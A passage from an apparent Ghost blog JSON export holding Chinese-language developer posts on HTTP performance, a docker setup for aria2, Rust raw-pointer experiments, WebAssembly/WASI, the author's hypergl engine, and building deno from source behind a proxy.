</td><td>9+ (prefetch)\\n              </td><td>n/a\\n              </td><td>10+\\n              </td><td>11+\\n        </td></tr></tbody></table>\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><table>\n          <thead>\n            <tr>\n              <th>Browser\n              </th><th>dns-prefetch\n              </th><th>subresource\n              </th><th>prefetch\n              </th><th>prerender\n<pre><code>      &lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;\n        &lt;tr&gt;\n          &lt;td&gt;Firefox\n          &lt;/td&gt;&lt;td&gt;3.5+\n          &lt;/td&gt;&lt;td&gt;n/a\n          &lt;/td&gt;&lt;td&gt;3.5+\n          &lt;/td&gt;&lt;td&gt;n/a\n\n        &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;\n          &lt;td&gt;Chrome\n          &lt;/td&gt;&lt;td&gt;1.0+\n          &lt;/td&gt;&lt;td&gt;1.0+\n          &lt;/td&gt;&lt;td&gt;1.0+\n          &lt;/td&gt;&lt;td&gt;13+\n\n        &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;\n          &lt;td&gt;Safari\n          &lt;/td&gt;&lt;td&gt;5.01+\n          &lt;/td&gt;&lt;td&gt;n/a\n          &lt;/td&gt;&lt;td&gt;n/a\n          &lt;/td&gt;&lt;td&gt;n/a\n\n        &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;\n          &lt;td&gt;IE\n          &lt;/td&gt;&lt;td&gt;9+ (prefetch)\n          &lt;/td&gt;&lt;td&gt;n/a\n          &lt;/td&gt;&lt;td&gt;10+\n          &lt;/td&gt;&lt;td&gt;11+\n    &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"184","plaintext":" Browser dns-prefetch subresource prefetch prerender      </th></tr></thead><tbody>\n        <tr>\n          <td>Firefox\n          </td><td>3.5+\n          </td><td>n/a\n          </td><td>3.5+\n          </td><td>n/a\n\n        </td></tr><tr>\n          <td>Chrome\n          </td><td>1.0+\n          </td><td>1.0+\n          </td><td>1.0+\n          </td><td>13+\n\n        </td></tr><tr>\n          <td>Safari\n          </td><td>5.01+\n          </td><td>n/a\n          </td><td>n/a\n          </td><td>n/a\n\n        </td></tr><tr>\n          <td>IE\n          </td><td>9+ (prefetch)\n          </td><td>n/a\n          </td><td>10+\n          </td><td>11+\n    </td></tr></tbody></table>","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-03-28T15:55:27.000Z","created_by":"1","updated_at":"2019-03-28T17:42:45.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d375","uuid":"32a13bad-29fe-4c7e-8abe-daa097a86e12","title":"HTTP / 1.1性能提升","slug":"untitled-9","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 减少DNS查找\\n\\n每个主机名解析都需要网络往返，对请求施加延迟并在查找过程中阻止请求。使用dns-prefetch。\\n\\n> 减少HTTP请求\\n\\n消除页面上不必要的资源。\\n\\n> 使用CDN(Content Delivery Network)\\n\\n在地理位置上将数据定位在更靠近客户端的位置可以显着减少每个TCP连接的网络延迟并提高吞吐量。\\n\\n> 添加Expires标头并配置ETag\\n\\n应缓存相关资源，以避免在每个页面上重新请求相同的字节。Expires标头可用于指定对象的缓存生存期，允许直接从用户的缓存中检索它并完全消除HTTP请求。ETag和Last-Modified标头提供了有效的缓存重新验证机制 - 实际上是指纹或上次更新的时间戳。\\n\\n> Gzip\\n\\n在客户端和服务器之间传输时，所有基于文本的资产都应使用Gzip进行压缩。平均而言，Gzip将文件大小减小60-80％，这使其成为更简单的（服务器上的配置标志）和您可以做的高效益优化之一。\\n\\n> 避免HTTP重定向\\n\\nHTTP重定向可能非常昂贵，尤其是当它们将客户端重定向到不同的主机名时，这会导致额外的DNS查找，TCP连接延迟等。\\n\\n> 域分片\\n\\n 现代浏览器同域，只允许6个并行连接。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>减少DNS查找</p>\n</blockquote>\n<p>每个主机名解析都需要网络往返，对请求施加延迟并在查找过程中阻止请求。使用dns-prefetch。</p>\n<blockquote>\n<p>减少HTTP请求</p>\n</blockquote>\n<p>消除页面上不必要的资源。</p>\n<blockquote>\n<p>使用CDN(Content Delivery Network)</p>\n</blockquote>\n<p>在地理位置上将数据定位在更靠近客户端的位置可以显着减少每个TCP连接的网络延迟并提高吞吐量。</p>\n<blockquote>\n<p>添加Expires标头并配置ETag</p>\n</blockquote>\n<p>应缓存相关资源，以避免在每个页面上重新请求相同的字节。Expires标头可用于指定对象的缓存生存期，允许直接从用户的缓存中检索它并完全消除HTTP请求。ETag和Last-Modified标头提供了有效的缓存重新验证机制 - 实际上是指纹或上次更新的时间戳。</p>\n<blockquote>\n<p>Gzip</p>\n</blockquote>\n<p>在客户端和服务器之间传输时，所有基于文本的资产都应使用Gzip进行压缩。平均而言，Gzip将文件大小减小60-80％，这使其成为更简单的（服务器上的配置标志）和您可以做的高效益优化之一。</p>\n<blockquote>\n<p>避免HTTP重定向</p>\n</blockquote>\n<p>HTTP重定向可能非常昂贵，尤其是当它们将客户端重定向到不同的主机名时，这会导致额外的DNS查找，TCP连接延迟等。</p>\n<blockquote>\n<p>域分片</p>\n</blockquote>\n<p>现代浏览器同域，只允许6个并行连接。</p>\n<!--kg-card-end: markdown-->","comment_id":"185","plaintext":"> 减少DNS查找\n\n\n每个主机名解析都需要网络往返，对请求施加延迟并在查找过程中阻止请求。使用dns-prefetch。\n\n> 减少HTTP请求\n\n\n消除页面上不必要的资源。\n\n> 使用CDN(Content Delivery Network)\n\n\n在地理位置上将数据定位在更靠近客户端的位置可以显着减少每个TCP连接的网络延迟并提高吞吐量。\n\n> 添加Expires标头并配置ETag\n\n\n应缓存相关资源，以避免在每个页面上重新请求相同的字节。Expires标头可用于指定对象的缓存生存期，允许直接从用户的缓存中检索它并完全消除HTTP请求。ETag和Last-Modified标头提供了有效的缓存重新验证机制\n- 实际上是指纹或上次更新的时间戳。\n\n> Gzip\n\n\n在客户端和服务器之间传输时，所有基于文本的资产都应使用Gzip进行压缩。平均而言，Gzip将文件大小减小60-80％，这使其成为更简单的（服务器上的配置标志）和您可以做的高效益优化之一。\n\n> 避免HTTP重定向\n\n\nHTTP重定向可能非常昂贵，尤其是当它们将客户端重定向到不同的主机名时，这会导致额外的DNS查找，TCP连接延迟等。\n\n> 域分片\n\n\n现代浏览器同域，只允许6个并行连接。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-03-28T16:57:24.000Z","created_by":"1","updated_at":"2019-03-28T17:29:14.000Z","updated_by":"1","published_at":"2019-03-28T17:01:28.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d376","uuid":"b5f04672-af67-483e-94aa-5452a4727e94","title":"ngaria2-web","slug":"untitled-10","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\ndocker run -d \\\\\\n--name unraid-aria2-with-webui \\\\\\n-p 6800:6800 \\\\\\n-p 6880:80 \\\\\\n-v /data/aria2_conf:/conf \\\\\\n-v /www/wwwroot/dl.dadigua.win:/download \\\\\\n-e SECRET=YOUR_SECRET_CODE \\\\\\nfanningert/aria2-with-ariang\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>docker run -d \\\n--name unraid-aria2-with-webui \\\n-p 6800:6800 \\\n-p 6880:80 \\\n-v /data/aria2_conf:/conf \\\n-v /www/wwwroot/dl.dadigua.win:/download \\\n-e SECRET=YOUR_SECRET_CODE \\\nfanningert/aria2-with-ariang\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"186","plaintext":"docker run -d \\\n--name unraid-aria2-with-webui \\\n-p 6800:6800 \\\n-p 6880:80 \\\n-v /data/aria2_conf:/conf \\\n-v /www/wwwroot/dl.dadigua.win:/download \\\n-e SECRET=YOUR_SECRET_CODE \\\nfanningert/aria2-with-ariang","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-04-02T15:53:11.000Z","created_by":"1","updated_at":"2019-04-02T15:53:26.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d377","uuid":"6e2b5d98-4397-482e-a3c8-4fe8af0694a2","title":"rust","slug":"rust","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\n\\n\\nfn main() {\\n        #[derive(Debug)]\\n        struct A(i32);\\n        let mut a = A(2);\\n        let p_a: *mut A = &mut a;\\n   \\n        unsafe {\\n            (*p_a).0 = 4;\\n            // println!(\\\"A:{:?}\\\", *p_a);\\n            let q = *p_a;\\n            println!(\\\"A:{:?}\\\", q);\\n        }\\n        println!(\\\"A:{:?}\\\", a);\\n}\\n\\n```\\n\\n```\\n#[derive(Debug)]\\nstruct A(i32,Box<B>);\\n#[derive(Debug)]\\nstruct B(i32);\\nfn mut1(a:&mut A){\\n    a.0=123;\\n    mut2(a.1.as_mut());\\n    a.0=1237;\\n}\\n\\nfn mut2(a:&mut B){\\n    (*a).0=1253;\\n}\\n\\nfn main() {\\n    let mut a = A(2,Box::new(B(2)));\\n    mut1(&mut a);\\n    println!(\\\"{:?}\\\",a);\\n}\\n\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>\n\nfn main() {\n        #[derive(Debug)]\n        struct A(i32);\n        let mut a = A(2);\n        let p_a: *mut A = &amp;mut a;\n   \n        unsafe {\n            (*p_a).0 = 4;\n            // println!(&quot;A:{:?}&quot;, *p_a);\n            let q = *p_a;\n            println!(&quot;A:{:?}&quot;, q);\n        }\n        println!(&quot;A:{:?}&quot;, a);\n}\n\n</code></pre>\n<pre><code>#[derive(Debug)]\nstruct A(i32,Box&lt;B&gt;);\n#[derive(Debug)]\nstruct B(i32);\nfn mut1(a:&amp;mut A){\n    a.0=123;\n    mut2(a.1.as_mut());\n    a.0=1237;\n}\n\nfn mut2(a:&amp;mut B){\n    (*a).0=1253;\n}\n\nfn main() {\n    let mut a = A(2,Box::new(B(2)));\n    mut1(&amp;mut a);\n    println!(&quot;{:?}&quot;,a);\n}\n\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"187","plaintext":"\n\nfn main() {\n        #[derive(Debug)]\n        struct A(i32);\n        let mut a = A(2);\n        let p_a: *mut A = &mut a;\n   \n        unsafe {\n            (*p_a).0 = 4;\n            // println!(\"A:{:?}\", *p_a);\n            let q = *p_a;\n            println!(\"A:{:?}\", q);\n        }\n        println!(\"A:{:?}\", a);\n}\n\n\n\n#[derive(Debug)]\nstruct A(i32,Box<B>);\n#[derive(Debug)]\nstruct B(i32);\nfn mut1(a:&mut A){\n    a.0=123;\n    mut2(a.1.as_mut());\n    a.0=1237;\n}\n\nfn mut2(a:&mut B){\n    (*a).0=1253;\n}\n\nfn main() {\n    let mut a = A(2,Box::new(B(2)));\n    mut1(&mut a);\n    println!(\"{:?}\",a);\n}","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-04-23T12:31:19.000Z","created_by":"1","updated_at":"2019-04-23T13:09:48.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d378","uuid":"d4a205ba-7bd4-4316-b075-e862adbcbd25","title":"WebAssembly未来","slug":"hyperglde-wei-lai","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"这段时间再次研究了下wasm，这次应该不是狼来了。\\n\\n> 什么是WASM\\n\\nWebAssembly是一种新的编码方式，可以在现代的网络浏览器中运行 － 它是一种低级的类汇编语言，具有紧凑的二进制格式，可以接近原生的性能运行，并为诸如C / C ++等语言提供一个编译目标，以便它们可以在Web上运行。它也被设计为可以与JavaScript共存，允许两者一起工作。\\n\\n这是MDN的解释，它原本的目标是在web中运行的，和js一样。不过后来js也有了node，拥有跨平台的能力。但是，就算js能写native，js的弱点是不能避免的。比如，性能问题，多线程，就算是在浏览器环境，它的问题也很大，webgl这么多年都没发展起来，它的性能问题也是原因之一（强行让js背下锅）。\\n\\n因此，这一切为啥不用wasm，在浏览器环境，js优势还是很明显的。在wasm2.0还未实现前。如果wasm2.0出来，wasm和js都是浏览器的一等公民了，甚至比js地位更高。\\n1.比如直接操作dom，调用浏览器的api。现在都是绑定到js，还要转换成js值类型，虽然wasm快，但是这么一来性能优势没那么明显了。\\n2.wasm2.0支持SIMD，这个在矩阵运算等方面。有2-4倍的提升。\\n3.wasm2.0支持多线程。\\n\\n> 什么是[WASI](https://hacks.mozilla.org/2019/03/standardizing-wasi-a-webassembly-system-interface/)\\n\\n上面说了，wasm在浏览器未来对比js的优势。还没说native。现在，一些大佬已经看中了WebAssembly的优势（性能高，安全，可移植性），如rust团队，开发WebAssembly的native接口，未来wasm可以运行在native。WASI将覆盖与POSIX相同的接口，包括文件，网络，时钟和随机数，Opengl等内容。与POSIX不用的是，WebAssembly是沙箱。这意味着代码无法直接与操作系统通信。这一点类似浏览器。\\n\\nPromise<WebAssembly.Instance> WebAssembly.instantiate(module, importObject); importObject这个是声明需要导入函数。在wasi中，声明 需要请求网络，读写文件等权限。这样一个wasi程序执行需要的权限一目了然。类似苹果，安卓的权限管理。这一点其实也和deno很像，看来大佬都想到一块去了。\\n\\nwasm作为一种抽象的汇编码，可移植性，高性能不用说了。\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>这段时间再次研究了下wasm，这次应该不是狼来了。</p>\n<blockquote>\n<p>什么是WASM</p>\n</blockquote>\n<p>WebAssembly是一种新的编码方式，可以在现代的网络浏览器中运行 － 它是一种低级的类汇编语言，具有紧凑的二进制格式，可以接近原生的性能运行，并为诸如C / C ++等语言提供一个编译目标，以便它们可以在Web上运行。它也被设计为可以与JavaScript共存，允许两者一起工作。</p>\n<p>这是MDN的解释，它原本的目标是在web中运行的，和js一样。不过后来js也有了node，拥有跨平台的能力。但是，就算js能写native，js的弱点是不能避免的。比如，性能问题，多线程，就算是在浏览器环境，它的问题也很大，webgl这么多年都没发展起来，它的性能问题也是原因之一（强行让js背下锅）。</p>\n<p>因此，这一切为啥不用wasm，在浏览器环境，js优势还是很明显的。在wasm2.0还未实现前。如果wasm2.0出来，wasm和js都是浏览器的一等公民了，甚至比js地位更高。<br>\n1.比如直接操作dom，调用浏览器的api。现在都是绑定到js，还要转换成js值类型，虽然wasm快，但是这么一来性能优势没那么明显了。<br>\n2.wasm2.0支持SIMD，这个在矩阵运算等方面。有2-4倍的提升。<br>\n3.wasm2.0支持多线程。</p>\n<blockquote>\n<p>什么是<a href=\"https://hacks.mozilla.org/2019/03/standardizing-wasi-a-webassembly-system-interface/\">WASI</a></p>\n</blockquote>\n<p>上面说了，wasm在浏览器未来对比js的优势。还没说native。现在，一些大佬已经看中了WebAssembly的优势（性能高，安全，可移植性），如rust团队，开发WebAssembly的native接口，未来wasm可以运行在native。WASI将覆盖与POSIX相同的接口，包括文件，网络，时钟和随机数，Opengl等内容。与POSIX不用的是，WebAssembly是沙箱。这意味着代码无法直接与操作系统通信。这一点类似浏览器。</p>\n<p>Promise&lt;WebAssembly.Instance&gt; WebAssembly.instantiate(module, importObject); importObject这个是声明需要导入函数。在wasi中，声明 需要请求网络，读写文件等权限。这样一个wasi程序执行需要的权限一目了然。类似苹果，安卓的权限管理。这一点其实也和deno很像，看来大佬都想到一块去了。</p>\n<p>wasm作为一种抽象的汇编码，可移植性，高性能不用说了。</p>\n<!--kg-card-end: markdown-->","comment_id":"188","plaintext":"这段时间再次研究了下wasm，这次应该不是狼来了。\n\n> 什么是WASM\n\n\nWebAssembly是一种新的编码方式，可以在现代的网络浏览器中运行 － 它是一种低级的类汇编语言，具有紧凑的二进制格式，可以接近原生的性能运行，并为诸如C\n/ C ++等语言提供一个编译目标，以便它们可以在Web上运行。它也被设计为可以与JavaScript共存，允许两者一起工作。\n\n这是MDN的解释，它原本的目标是在web中运行的，和js一样。不过后来js也有了node，拥有跨平台的能力。但是，就算js能写native，js的弱点是不能避免的。比如，性能问题，多线程，就算是在浏览器环境，它的问题也很大，webgl这么多年都没发展起来，它的性能问题也是原因之一（强行让js背下锅）。\n\n因此，这一切为啥不用wasm，在浏览器环境，js优势还是很明显的。在wasm2.0还未实现前。如果wasm2.0出来，wasm和js都是浏览器的一等公民了，甚至比js地位更高。\n1.比如直接操作dom，调用浏览器的api。现在都是绑定到js，还要转换成js值类型，虽然wasm快，但是这么一来性能优势没那么明显了。\n2.wasm2.0支持SIMD，这个在矩阵运算等方面。有2-4倍的提升。\n3.wasm2.0支持多线程。\n\n> 什么是WASI\n[https://hacks.mozilla.org/2019/03/standardizing-wasi-a-webassembly-system-interface/]\n\n\n上面说了，wasm在浏览器未来对比js的优势。还没说native。现在，一些大佬已经看中了WebAssembly的优势（性能高，安全，可移植性），如rust团队，开发WebAssembly的native接口，未来wasm可以运行在native。WASI将覆盖与POSIX相同的接口，包括文件，网络，时钟和随机数，Opengl等内容。与POSIX不用的是，WebAssembly是沙箱。这意味着代码无法直接与操作系统通信。这一点类似浏览器。\n\nPromise<WebAssembly.Instance> WebAssembly.instantiate(module, importObject);\nimportObject这个是声明需要导入函数。在wasi中，声明\n需要请求网络，读写文件等权限。这样一个wasi程序执行需要的权限一目了然。类似苹果，安卓的权限管理。这一点其实也和deno很像，看来大佬都想到一块去了。\n\nwasm作为一种抽象的汇编码，可移植性，高性能不用说了。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-04-26T12:12:30.000Z","created_by":"1","updated_at":"2019-04-26T13:39:51.000Z","updated_by":"1","published_at":"2019-04-26T13:31:10.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d379","uuid":"1b94d40f-7c91-4632-abec-dbf9a2417735","title":"hypergl新的开始——wasm-math库","slug":"xin-de-hypergl-mathku","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"hypergl 的核心部分，打算用rust重写。如math，模型加载和渲染部分。\\n\\n[wasm-math](https://github.com/laopo001/wasm-math)（还在开发中）。测试下，矩阵栈的计算大概有10倍多的性能提升。wasm2.0加入SIMD后，性能还会更高。\\n![](/content/images/2019/04/QQ--20190429172826.png)\\n\\n以后还会使用opengl重写渲染部分，最后编译到webgl。这样更有利于跨平台。js只是作为脚本语言写逻辑。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>hypergl 的核心部分，打算用rust重写。如math，模型加载和渲染部分。</p>\n<p><a href=\"https://github.com/laopo001/wasm-math\">wasm-math</a>（还在开发中）。测试下，矩阵栈的计算大概有10倍多的性能提升。wasm2.0加入SIMD后，性能还会更高。<br>\n<img src=\"/content/images/2019/04/QQ--20190429172826.png\" alt=\"\"></p>\n<p>以后还会使用opengl重写渲染部分，最后编译到webgl。这样更有利于跨平台。js只是作为脚本语言写逻辑。</p>\n<!--kg-card-end: markdown-->","comment_id":"189","plaintext":"hypergl 的核心部分，打算用rust重写。如math，模型加载和渲染部分。\n\nwasm-math [https://github.com/laopo001/wasm-math]\n（还在开发中）。测试下，矩阵栈的计算大概有10倍多的性能提升。wasm2.0加入SIMD后，性能还会更高。\n\n\n以后还会使用opengl重写渲染部分，最后编译到webgl。这样更有利于跨平台。js只是作为脚本语言写逻辑。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-04-27T10:46:33.000Z","created_by":"1","updated_at":"2019-04-29T09:40:57.000Z","updated_by":"1","published_at":"2019-04-28T05:50:42.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d37a","uuid":"9ac6af93-f096-4172-a918-94bd88a9c59d","title":"hypergl error分类","slug":"hypergl-errorfen-lei","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"写程序的经常遇到很多错误，异常。rust社区把错误分成3类，`失败`,`预期的错误`,`恐慌`，我觉得很好。在hypergl中我也这么分类。\\n\\n> 失败\\n\\n比如网络请求,当请求失败会抛出一个错误，这里分类成一个失败。失败是允许的，并且允许重试，不会阻止程序继续运行。\\n\\n> 预期的错误\\n\\n这个是我们在写程序中提前预料的错误。如，检查程序，函数输入，如果用户输入错误。提示用户更改。\\n这也是告诉用户不用慌，一切都在意料之中，按提示改就好了。\\n\\n> 未知的错误（恐慌）\\n\\n这个在其他语言中叫异常，或者恐慌。就是程序中出现致命错误，而且，还是意料之外的。一般会直接挂掉程序。这时可以要用户提issue了\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>写程序的经常遇到很多错误，异常。rust社区把错误分成3类，<code>失败</code>,<code>预期的错误</code>,<code>恐慌</code>，我觉得很好。在hypergl中我也这么分类。</p>\n<blockquote>\n<p>失败</p>\n</blockquote>\n<p>比如网络请求,当请求失败会抛出一个错误，这里分类成一个失败。失败是允许的，并且允许重试，不会阻止程序继续运行。</p>\n<blockquote>\n<p>预期的错误</p>\n</blockquote>\n<p>这个是我们在写程序中提前预料的错误。如，检查程序，函数输入，如果用户输入错误。提示用户更改。<br>\n这也是告诉用户不用慌，一切都在意料之中，按提示改就好了。</p>\n<blockquote>\n<p>未知的错误（恐慌）</p>\n</blockquote>\n<p>这个在其他语言中叫异常，或者恐慌。就是程序中出现致命错误，而且，还是意料之外的。一般会直接挂掉程序。这时可以要用户提issue了</p>\n<!--kg-card-end: markdown-->","comment_id":"190","plaintext":"写程序的经常遇到很多错误，异常。rust社区把错误分成3类，失败,预期的错误,恐慌，我觉得很好。在hypergl中我也这么分类。\n\n> 失败\n\n\n比如网络请求,当请求失败会抛出一个错误，这里分类成一个失败。失败是允许的，并且允许重试，不会阻止程序继续运行。\n\n> 预期的错误\n\n\n这个是我们在写程序中提前预料的错误。如，检查程序，函数输入，如果用户输入错误。提示用户更改。\n这也是告诉用户不用慌，一切都在意料之中，按提示改就好了。\n\n> 未知的错误（恐慌）\n\n\n这个在其他语言中叫异常，或者恐慌。就是程序中出现致命错误，而且，还是意料之外的。一般会直接挂掉程序。这时可以要用户提issue了","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-04-29T03:19:39.000Z","created_by":"1","updated_at":"2019-04-29T05:47:44.000Z","updated_by":"1","published_at":"2019-04-29T05:47:44.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d37b","uuid":"d6dfe91b-9de1-4c91-9b82-3dc89589e266","title":"smallpt","slug":"smallpt","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"[smallpt](http://www.kevinbeason.com/smallpt/)这是一个c++版的平行光路径最终，迷你实现。我写了有一个rust版本。[raytrace-parallel](https://github.com/laopo001/raytrace-parallel.git)。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p><a href=\"http://www.kevinbeason.com/smallpt/\">smallpt</a>这是一个c++版的平行光路径最终，迷你实现。我写了有一个rust版本。<a href=\"https://github.com/laopo001/raytrace-parallel.git\">raytrace-parallel</a>。</p>\n<!--kg-card-end: markdown-->","comment_id":"191","plaintext":"smallpt [http://www.kevinbeason.com/smallpt/]这是一个c++版的平行光路径最终，迷你实现。我写了有一个rust版本。\nraytrace-parallel [https://github.com/laopo001/raytrace-parallel.git]。","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-06-04T04:05:59.000Z","created_by":"1","updated_at":"2019-06-04T06:32:49.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d37c","uuid":"706f2372-c982-4ee2-8720-5e15330b5228","title":"deno wsl下从源码安装","slug":"chu-chang-deno","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"deno从源码安装。[官方安装文档](https://deno.land/manual.html#buildfromsource)。推荐使用linux或wsl环境。\\n\\n> fetch FAIL之类的错误，墙的问题。v8的依赖拉不下来。不过可以使用代理。\\n\\n在用户目录创建一个.boto文件。然后用export NO_AUTH_BOTO_CONFIG=\\\"~/.boto\\\"，脚本会读取这个`NO_AUTH_BOTO_CONFIG`的环境变量的配置。\\n```\\n[Boto]\\nproxy=127.0.0.1\\nproxy_port=8123\\n```\\n注意：这里8123端口的代理要用http代理。不能用sock5。所以，要用[polipo](https://my.oschina.net/u/1249401/blog/1841607)，这是一个命令行代理工具。安装一下。\\n\\n> [sccache](https://github.com/mozilla/sccache#installation)安装\\n\\n这个又依赖`openssl`，又要安装`sudo apt-get install pkg-config libssl-dev`。\\n\\n这样前置操作搞完后，应该可以。\\n\\n还有一个坑是，vscode-remote 开发使用的时候。项目下的文件夹不能执行 mv copy 操作。会阻止构建。关闭vscode就行。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>deno从源码安装。<a href=\"https://deno.land/manual.html#buildfromsource\">官方安装文档</a>。推荐使用linux或wsl环境。</p>\n<blockquote>\n<p>fetch FAIL之类的错误，墙的问题。v8的依赖拉不下来。不过可以使用代理。</p>\n</blockquote>\n<p>在用户目录创建一个.boto文件。然后用export NO_AUTH_BOTO_CONFIG=&quot;~/.boto&quot;，脚本会读取这个<code>NO_AUTH_BOTO_CONFIG</code>的环境变量的配置。</p>\n<pre><code>[Boto]\nproxy=127.0.0.1\nproxy_port=8123\n</code></pre>\n<p>注意：这里8123端口的代理要用http代理。不能用sock5。所以，要用<a href=\"https://my.oschina.net/u/1249401/blog/1841607\">polipo</a>，这是一个命令行代理工具。安装一下。</p>\n<blockquote>\n<p><a href=\"https://github.com/mozilla/sccache#installation\">sccache</a>安装</p>\n</blockquote>\n<p>这个又依赖<code>openssl</code>，又要安装<code>sudo apt-get install pkg-config libssl-dev</code>。</p>\n<p>这样前置操作搞完后，应该可以。</p>\n<p>还有一个坑是，vscode-remote 开发使用的时候。项目下的文件夹不能执行 mv copy 操作。会阻止构建。关闭vscode就行。</p>\n<!--kg-card-end: markdown-->","comment_id":"192","plaintext":"deno从源码安装。官方安装文档 [https://deno.land/manual.html#buildfromsource]\n。推荐使用linux或wsl环境。\n\n> fetch FAIL之类的错误，墙的问题。v8的依赖拉不下来。不过可以使用代理。\n\n\n在用户目录创建一个.boto文件。然后用export NO_AUTH_BOTO_CONFIG=\"~/.boto\"，脚本会读取这个\nNO_AUTH_BOTO_CONFIG的环境变量的配置。\n\n[Boto]\nproxy=127.0.0.1\nproxy_port=8123\n\n\n注意：这里8123端口的代理要用http代理。不能用sock5。所以，要用polipo\n[https://my.oschina.net/u/1249401/blog/1841607]，这是一个命令行代理工具。安装一下。\n\n> sccache [https://github.com/mozilla/sccache#installation]安装\n\n\n这个又依赖openssl，又要安装sudo apt-get install pkg-config libssl-dev。\n\n这样前置操作搞完后，应该可以。\n\n还有一个坑是，vscode-remote 开发使用的时候。项目下的文件夹不能执行 mv copy 操作。会阻止构建。关闭vscode就行。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-06-10T08:09:48.000Z","created_by":"1","updated_at":"2019-06-10T09:58:00.000Z","updated_by":"1","published_at":"2019-06-10T09:55:19.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d37d","uuid":"987aed39-11cd-4861-862f-4140a95eda81","title":"(Untitled)","slug":"deno","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","html":null,"comment_id":"193","plaintext":null,"feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-06-14T09:33:12.000Z","created_by":"1","updated_at":"2019-06-14T09:33:12.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"